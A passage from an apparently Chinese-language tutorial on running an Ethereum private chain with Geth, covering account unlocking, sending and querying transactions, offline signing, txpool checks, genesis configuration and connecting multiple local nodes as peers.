class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>600</code> 表示账户将保持解锁 600 秒。</li></ul><h4 id="2-查询交易"><a href="#2-查询交易" class="headerlink" title="2. 查询交易"></a>2. <strong>查询交易</strong></h4><h5 id="根据交易哈希查询交易信息"><a href="#根据交易哈希查询交易信息" class="headerlink" title="根据交易哈希查询交易信息"></a>根据交易哈希查询交易信息</h5><p>发送交易后，你可以使用交易哈希查询交易的详细信息：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getTransaction</span><span class="token punctuation">(</span><span class="token string">"0xTransactionHash"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将返回交易的详细信息，包括发送者、接收者、金额、gas 费用等。</p><p><code>eth.getTransaction()</code> 会返回一个包含该交易详细信息的对象，常见的字段包括：</p><ul><li><code>blockHash</code>: 该交易所属区块的哈希。</li><li><code>blockNumber</code>: 该交易所属区块的区块号。</li><li><code>from</code>: 发起该交易的地址。</li><li><code>gas</code>: 该交易消耗的 gas 限额。</li><li><code>gasPrice</code>: 该交易的 gas 价格。</li><li><code>hash</code>: 该交易的哈希值。</li><li><code>input</code>: 交易的数据字段，通常是合约调用时传递的数据。</li><li><code>nonce</code>: 发送方账户的 nonce 值，表示该账户发起的交易计数。</li><li><code>to</code>: 交易接收者的地址，如果是合约创建交易则为 <code>null</code>。</li><li><code>transactionIndex</code>: 该交易在区块中的索引。</li><li><code>value</code>: 该交易中发送的以太币数量（以 wei 为单位）。</li></ul><h5 id="交易未打包"><a href="#交易未打包" class="headerlink" title="交易未打包"></a>交易未打包</h5><p><strong><code>blockHash</code>: <code>null</code></strong> 当交易尚未被打包时，<code>blockHash</code> 的值为 <code>null</code>，因为该交易还没有被包含在任何区块中。</p><p><strong><code>blockNumber</code>: <code>null</code></strong> 同样，由于交易未被打包，<code>blockNumber</code> 也会是 <code>null</code>，表示该交易还未属于任何区块。</p><p><strong><code>transactionIndex</code>: <code>null</code></strong> 因为交易还没有被打包到区块，因此也没有在区块中的位置，<code>transactionIndex</code> 为 <code>null</code>。</p><p><strong>其他字段</strong> 其他交易的基本信息仍然可以被查询到，包括：</p><ul><li><code>from</code>: 发送者的地址。</li><li><code>to</code>: 接收者的地址（或者 <code>null</code> 如果是合约创建交易）。</li><li><code>value</code>: 发送的以太币数量（以 wei 为单位）。</li><li><code>gas</code>: 该交易所消耗的 Gas 限额。</li><li><code>gasPrice</code>: Gas 价格。</li><li><code>nonce</code>: 发送者账户的交易计数。</li><li><code>input</code>: 交易中包含的数据（如合约调用时的参数）。</li></ul><h5 id="根据交易哈希查询交易收据"><a href="#根据交易哈希查询交易收据" class="headerlink" title="根据交易哈希查询交易收据"></a>根据交易哈希查询交易收据</h5><p>要查看交易是否成功被打包到区块中，可以使用以下命令查询交易收据：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getTransactionReceipt</span><span class="token punctuation">(</span><span class="token string">"0xTransactionHash"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回的交易收据包含以下信息：</p><ul><li><code>status</code>: 交易的执行状态，<code>1</code> 表示成功，<code>0</code> 表示失败。</li><li><code>blockHash</code>: 包含该交易的区块的哈希。</li><li><code>blockNumber</code>: 区块号。</li><li><code>transactionHash</code>: 交易哈希。</li><li><code>gasUsed</code>: 此交易消耗的 gas 量。</li><li><code>logs</code>: 该交易的事件日志列表</li></ul><h4 id="3-创建自定义交易"><a href="#3-创建自定义交易" class="headerlink" title="3. 创建自定义交易"></a>3. <strong>创建自定义交易</strong></h4><p>你可以使用 <code>eth.sendTransaction</code> 创建自定义交易，除了 <code>from</code> 和 <code>to</code> 之外，还可以指定 <code>gas</code>、<code>gasPrice</code> 和 <code>data</code> 等字段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token literal-property property">from</span><span class="token operator">:</span> <span class="token string">"0xSenderAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xRecipientAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">gas</span><span class="token operator">:</span> <span class="token number">21000</span><span class="token punctuation">,</span>  <span class="token literal-property property">gasPrice</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">"gwei"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token string">"0xSomeData"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>gas</code>: 设置交易的 gas 限制，确保足够高。</li><li><code>gasPrice</code>: 设置每单位 gas 的价格，单位是 wei。</li></ul><h5 id="自定义-gas-价格"><a href="#自定义-gas-价格" class="headerlink" title="自定义 gas 价格"></a>自定义 gas 价格</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token literal-property property">from</span><span class="token operator">:</span> <span class="token string">"0xSenderAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xRecipientAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">gas</span><span class="token operator">:</span> <span class="token number">21000</span><span class="token punctuation">,</span>  <span class="token literal-property property">gasPrice</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">"gwei"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这将设置一个较高的 gas 价格，以加快交易打包。</p><h4 id="4-离线签名交易"><a href="#4-离线签名交易" class="headerlink" title="4. 离线签名交易"></a>4. <strong>离线签名交易</strong></h4><p>在某些场景下，你可能希望在离线状态下生成交易并签名，然后再发送。以下是离线签名交易的步骤：</p><h5 id="构建未签名交易"><a href="#构建未签名交易" class="headerlink" title="构建未签名交易"></a>构建未签名交易</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> rawTx <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token literal-property property">nonce</span><span class="token operator">:</span> web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getTransactionCount</span><span class="token punctuation">(</span><span class="token string">"0xSenderAddress"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">gasPrice</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toHex</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token string">'20'</span><span class="token punctuation">,</span> <span class="token string">'gwei'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">gasLimit</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toHex</span><span class="token punctuation">(</span><span class="token number">21000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xRecipientAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toHex</span><span class="token punctuation">(</span>web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'ether'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="签名交易"><a href="#签名交易" class="headerlink" title="签名交易"></a>签名交易</h5><p>使用 <code>eth.accounts.signTransaction</code> 函数来签名交易：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> signedTx <span class="token operator">=</span> eth<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span><span class="token function">signTransaction</span><span class="token punctuation">(</span>rawTx<span class="token punctuation">,</span> <span class="token string">"0xPrivateKey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="发送已签名交易"><a href="#发送已签名交易" class="headerlink" title="发送已签名交易"></a>发送已签名交易</h5><p>发送已签名的交易，可以使用 <code>eth.sendSignedTransaction</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">sendSignedTransaction</span><span class="token punctuation">(</span>signedTx<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'receipt'</span><span class="token punctuation">,</span> console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="5-批量发送交易"><a href="#5-批量发送交易" class="headerlink" title="5. 批量发送交易"></a>5. <strong>批量发送交易</strong></h4><p>如果你需要一次发送多笔交易，你可以在脚本中批量调用 <code>eth.sendTransaction</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token literal-property property">from</span><span class="token operator">:</span> <span class="token string">"0xSenderAddress"</span><span class="token punctuation">,</span>    <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xRecipientAddress"</span><span class="token punctuation">,</span>    <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-检查账户余额"><a href="#6-检查账户余额" class="headerlink" title="6. 检查账户余额"></a>6. <strong>检查账户余额</strong></h4><p>你可以随时使用以下命令检查账户的余额：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token string">"0xAddress"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>返回值为账户的余额，单位是 wei。如果你想以以太币（ether）显示，可以使用以下命令：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">web3<span class="token punctuation">.</span><span class="token function">fromWei</span><span class="token punctuation">(</span>eth<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token string">"0xAddress"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="7-检查交易池中的交易"><a href="#7-检查交易池中的交易" class="headerlink" title="7. 检查交易池中的交易"></a>7. <strong>检查交易池中的交易</strong></h4><p>交易被发送后，可能会在交易池中等待确认。你可以使用以下命令查看交易池中的状态：</p><h5 id="检查挂起的交易"><a href="#检查挂起的交易" class="headerlink" title="检查挂起的交易"></a>检查挂起的交易</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">txpool<span class="token punctuation">.</span>status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会返回交易池中的待处理和挂起的交易数量。</p><h5 id="查看具体的挂起交易"><a href="#查看具体的挂起交易" class="headerlink" title="查看具体的挂起交易"></a>查看具体的挂起交易</h5><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">txpool<span class="token punctuation">.</span>inspect<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会显示详细的待处理和挂起交易的信息。</p><h4 id="8-检查当前的-gas-价格"><a href="#8-检查当前的-gas-价格" class="headerlink" title="8. 检查当前的 gas 价格"></a>8. <strong>检查当前的 gas 价格</strong></h4><p>你可以使用以下命令来获取当前网络建议的 gas 价格：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>gasPrice<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>返回的值是以 wei 为单位的当前 gas 价格。</li></ul><h4 id="9-监听区块和交易事件"><a href="#9-监听区块和交易事件" class="headerlink" title="9. 监听区块和交易事件"></a>9. <strong>监听区块和交易事件</strong></h4><p>你可以通过监听事件来实时监控交易状态。例如，当新区块生成时，可以收到通知：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'newBlockHeaders'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>error<span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"connected"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">subscriptionId</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>subscriptionId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">blockHeader</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>blockHeader<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-交易命令汇总"><a href="#10-交易命令汇总" class="headerlink" title="10. 交易命令汇总"></a>10. <strong>交易命令汇总</strong></h4><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>eth.sendTransaction({...})</code></td><td>发送普通或自定义交易</td></tr><tr><td><code>personal.unlockAccount(...)</code></td><td>解锁账户以便发送交易</td></tr><tr><td><code>eth.getTransaction("txHash")</code></td><td>根据哈希查询交易详情</td></tr><tr><td><code>eth.getTransactionReceipt("txHash")</code></td><td>根据哈希查询交易收据</td></tr><tr><td><code>eth.getBalance("0xAddress")</code></td><td>查询账户余额</td></tr><tr><td><code>txpool.status</code></td><td>查看交易池的状态</td></tr><tr><td><code>eth.gasPrice</code></td><td>获取当前的 gas 价格</td></tr><tr><td><code>eth.accounts.signTransaction({...}, "privateKey")</code></td><td>离线签名交易</td></tr><tr><td><code>eth.sendSignedTransaction("signedTx")</code></td><td>发送已签名交易</td></tr></tbody></table><h3 id="2-6-私链多个节点连接的详细命令"><a href="#2-6-私链多个节点连接的详细命令" class="headerlink" title="2.6 私链多个节点连接的详细命令"></a>2.6 私链多个节点连接的详细命令</h3><p>在以太坊私链中，多个节点可以通过网络连接形成一个共识网络。在这种情况下，节点之间需要能够发现彼此，并保持同步。以下是详细的步骤和命令，用于设置并连接多个 Geth 节点到同一个私链网络。</p><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. <strong>准备工作</strong></h4><h5 id="创建-genesis-json-文件"><a href="#创建-genesis-json-文件" class="headerlink" title="创建 genesis.json 文件"></a>创建 <code>genesis.json</code> 文件</h5><p>在私链中，所有节点需要共享同一个创世区块 (<code>genesis block</code>)。首先，创建一个 <code>genesis.json</code> 文件，它定义了私链的创世区块和区块链的初始配置。</p><p>以下是一个示例 <code>genesis.json</code> 文件：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"chainId"</span><span class="token operator">:</span> <span class="token number">987</span><span class="token punctuation">,</span>     <span class="token property">"homesteadBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>     <span class="token property">"eip150Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token property">"eip155Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token property">"eip158Block"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token property">"byzantiumBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token property">"constantinopleBlock"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token property">"petersburgBlock"</span><span class="token operator">:</span> <span class="token number">0</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"difficulty"</span><span class="token operator">:</span> <span class="token string">"200000"</span><span class="token punctuation">,</span>  <span class="token property">"gasLimit"</span><span class="token operator">:</span> <span class="token string">"8000000"</span><span class="token punctuation">,</span>  <span class="token property">"alloc"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"0xYourAccountAddress"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"balance"</span><span class="token operator">:</span> <span class="token string">"1000000000000000000000"</span> <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>chainId</code>: 为私链设置一个独特的网络 ID（不同于主网和测试网）。</li><li><code>difficulty</code>: 设置初始挖矿难度，数值越低，挖矿越容易。</li><li><code>gasLimit</code>: 设置每个区块的 gas 上限。</li><li><code>alloc</code>: 为指定账户分配初始余额。</li></ul><h4 id="2-初始化-Geth-节点"><a href="#2-初始化-Geth-节点" class="headerlink" title="2. 初始化 Geth 节点"></a>2. <strong>初始化 Geth 节点</strong></h4><p>每个节点在第一次启动时都需要初始化私链。假设你已经有了 Geth，并将数据目录设置为 <code>./data</code>，可以使用以下命令初始化节点：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> ./data init genesis.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>--datadir ./data</code>: 指定节点的数据目录。</li><li><code>init genesis.json</code>: 使用 <code>genesis.json</code> 文件初始化链。</li></ul><p>每个私链节点都需要运行此命令。</p><h4 id="3-启动节点"><a href="#3-启动节点" class="headerlink" title="3. 启动节点"></a>3. <strong>启动节点</strong></h4><p>使用以下命令启动每个节点，并确保每个节点都指定相同的 <code>--networkid</code> 和使用 <code>--port</code> 参数设置不同的端口。</p><h5 id="启动第一个节点（节点A）"><a href="#启动第一个节点（节点A）" class="headerlink" title="启动第一个节点（节点A）"></a>启动第一个节点（节点A）</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> ./data <span class="token parameter variable">--networkid</span> <span class="token number">987</span> <span class="token parameter variable">--port</span> <span class="token number">30303</span> <span class="token parameter variable">--nodiscover</span> <span class="token parameter variable">--http</span> <span class="token parameter variable">--http.addr</span> <span class="token string">"127.0.0.1"</span> <span class="token parameter variable">--http.port</span> <span class="token number">8545</span> <span class="token parameter variable">--http.corsdomain</span> <span class="token string">"*"</span> <span class="token parameter variable">--http.api</span> <span class="token string">"eth,net,web3,personal,admin"</span> console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>--datadir ./data</code>: 指定节点的数据目录。</li><li><code>--networkid 987</code>: 设置网络 ID，与 <code>genesis.json</code> 中的 <code>chainId</code> 保持一致。</li><li><code>--port 30303</code>: 设置 P2P 连接的监听端口。</li><li><code>--nodiscover</code>: 禁用节点发现功能（如果你想手动连接节点）。</li><li><code>--http</code>: 启用 HTTP-RPC 服务，便于远程访问节点。</li><li><code>console</code>: 启动 Geth 控制台以便执行命令。</li></ul><h5 id="启动第二个节点（节点B）"><a href="#启动第二个节点（节点B）" class="headerlink" title="启动第二个节点（节点B）"></a>启动第二个节点（节点B）</h5><p>节点B可以在另一台机器上，也可以是本机上的另一个实例，只需要不同的数据目录和端口：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> ./node2data <span class="token parameter variable">--networkid</span> <span class="token number">987</span> <span class="token parameter variable">--port</span> <span class="token number">30304</span> <span class="token parameter variable">--nodiscover</span> <span class="token parameter variable">--http</span> <span class="token parameter variable">--http.addr</span> <span class="token string">"127.0.0.1"</span> <span class="token parameter variable">--http.port</span> <span class="token number">8546</span> <span class="token parameter variable">--http.corsdomain</span> <span class="token string">"*"</span> <span class="token parameter variable">--http.api</span> <span class="token string">"eth,net,web3,personal,admin"</span> console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>--datadir ./node2data</code>: 为节点B设置不同的数据目录。</li><li><code>--port 30304</code>: 节点B的 P2P 端口必须与节点A不同。</li><li><code>--http.port 8546</code>: HTTP-RPC 服务端口与节点A不同。</li></ul><h4 id="4-手动连接节点"><a href="#4-手动连接节点" class="headerlink" title="4. 手动连接节点"></a>4. <strong>手动连接节点</strong></h4><p>因为 <code>--nodiscover</code> 禁用了自动发现，必须手动连接节点。</p><h5 id="获取节点的-enode-信息"><a href="#获取节点的-enode-信息" class="headerlink" title="获取节点的 enode 信息"></a>获取节点的 <code>enode</code> 信息</h5><p>在节点A的控制台中，输入以下命令获取节点A的 <code>enode</code> 地址：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">admin<span class="token punctuation">.</span>nodeInfo<span class="token punctuation">.</span>enode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出类似于：</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token string">"enode://1234567890abcdef@127.0.0.1:30303?discport=0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个地址是节点A的唯一标识，后面的 <code>@127.0.0.1:30303</code> 表示节点A运行的 IP 和端口。</p><h5 id="连接节点B到节点A"><a href="#连接节点B到节点A" class="headerlink" title="连接节点B到节点A"></a>连接节点B到节点A</h5><p>在节点B的控制台中，使用 <code>admin.addPeer</code> 命令连接到节点A：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">admin<span class="token punctuation">.</span><span class="token function">addPeer</span><span class="token punctuation">(</span><span class="token string">"enode://1234567890abcdef@127.0.0.1:30303"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>将 <code>"enode://1234567890abcdef@127.0.0.1:30303"</code> 替换为节点A的 <code>enode</code> 地址。</li></ul><h5 id="验证节点是否连接"><a href="#验证节点是否连接" class="headerlink" title="验证节点是否连接"></a>验证节点是否连接</h5><p>在任何一个节点的控制台中，使用以下命令检查当前连接的对等节点数量：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">net<span class="token punctuation">.</span>peerCount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果节点成功连接，该命令将返回大于 <code>0</code> 的值。</li></ul><p>你还可以使用以下命令查看当前的连接节点列表：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">admin<span class="token punctuation">.</span>peers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-同步和挖矿"><a href="#5-同步和挖矿" class="headerlink" title="5. 同步和挖矿"></a>5. <strong>同步和挖矿</strong></h4><p>在节点A或节点B中，可以启动挖矿：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">miner<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">// 使用 1 个线程进行挖矿</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>挖到的区块会自动同步到其他节点。你可以通过以下命令查看区块高度：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span>blockNumber<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="6-账户和交易管理"><a href="#6-账户和交易管理" class="headerlink" title="6. 账户和交易管理"></a>6. <strong>账户和交易管理</strong></h4><h5 id="创建新账户"><a href="#创建新账户" class="headerlink" title="创建新账户"></a>创建新账户</h5><p>在 Geth 控制台中，你可以为每个节点创建新账户：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">personal<span class="token punctuation">.</span><span class="token function">newAccount</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="解锁账户-1"><a href="#解锁账户-1" class="headerlink" title="解锁账户"></a>解锁账户</h5><p>发送交易前需要解锁账户：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">personal<span class="token punctuation">.</span><span class="token function">unlockAccount</span><span class="token punctuation">(</span><span class="token string">"0xYourAccountAddress"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="发送交易"><a href="#发送交易" class="headerlink" title="发送交易"></a>发送交易</h5><p>在节点之间发送交易，可以使用 <code>eth.sendTransaction</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eth<span class="token punctuation">.</span><span class="token function">sendTransaction</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token literal-property property">from</span><span class="token operator">:</span> <span class="token string">"0xSenderAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">to</span><span class="token operator">:</span> <span class="token string">"0xRecipientAddress"</span><span class="token punctuation">,</span>  <span class="token literal-property property">value</span><span class="token operator">:</span> web3<span class="token punctuation">.</span><span class="token function">toWei</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"ether"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>from</code>: 发送者账户地址。</li><li><code>to</code>: 接收者账户地址。</li><li><code>value</code>: 转账金额，单位为 wei。</li></ul><h4 id="7-设置启动脚本"><a href="#7-设置启动脚本" class="headerlink" title="7. 设置启动脚本"></a>7. <strong>设置启动脚本</strong></h4><p>为了方便，你可以将节点启动命令放入 <code>.bat</code> 或 <code>.cmd</code> 文件中，在 Windows 上直接双击执行。例如，创建一个 <code>start_nodeA.bat</code> 文件，内容为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter variable">--datadir</span> ./data <span class="token parameter variable">--networkid</span> <span class="token number">987</span> <span class="token parameter variable">--port</span> <span class="token number">30303</span> <span class="token parameter variable">--nodiscover</span> <span class="token parameter variable">--http</span> <span class="token parameter variable">--http.addr</span> <span class="token string">"127.0.0.1"</span> <span class="token parameter variable">--http.port</span> <span class="token number">8545</span> <span class="token parameter variable">--http.corsdomain</span> <span class="token string">"*"</span> <span class="token parameter variable">--http.api</span> <span class="token string">"eth,net,web3,personal,admin"</span> console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后创建 <code>start_nodeB.bat</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">geth <span class="token parameter 